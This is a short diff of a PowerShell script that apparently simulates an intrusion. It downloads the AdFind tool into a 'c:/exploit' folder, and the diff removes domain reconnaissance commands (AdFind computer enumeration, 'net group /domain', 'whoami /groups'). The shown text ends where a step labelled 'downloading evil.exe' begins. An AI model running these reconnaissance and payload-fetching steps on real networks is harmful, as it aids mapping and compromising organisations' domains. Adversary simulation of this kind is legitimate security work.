@@ -42,11 +42,11 @@ Invoke-WebRequest -UseBasicParsing -Uri "https://www.joeware.net/downloads/dl2.p
 -ContentType "application/x-www-form-urlencoded" `
 -Body "download=AdFind.zip&email=&B1=Download+Now" -OutFile $outputPath
 Expand-Archive -Path $outputPath -DestinationPath $adfindPath
-c:/exploit/adfind/adfind.exe -f "objectcategory=computer" > c:/exploit/computers.txt
+
 
 "Checking up the domain"
-net group /domain > c:/exploit/group_domains.txt
-whoami /groups > c:/exploit/user_group.txt
+
+
 
 "downloading evil.exe"
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
